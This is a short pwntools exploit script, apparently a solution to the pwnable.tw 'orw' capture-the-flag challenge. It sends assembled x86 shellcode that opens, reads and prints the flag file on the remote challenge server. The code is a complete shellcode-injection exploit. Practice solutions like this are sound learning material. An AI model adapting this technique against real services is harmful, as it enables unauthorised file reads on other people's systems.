#!/usr/bin/env python2

from pwn import *
#  sh = process("./orw")
sh = remote('chall.pwnable.tw',10001)
context.log_level = 'debug'

open_shellcode = "xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;"
read_shellcode = "mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80;"
write_shellcode = "mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x80;"
shellcode = open_shellcode + read_shellcode + write_shellcode


sh.recv()

sh.sendline(asm(shellcode))

sh.interactive()
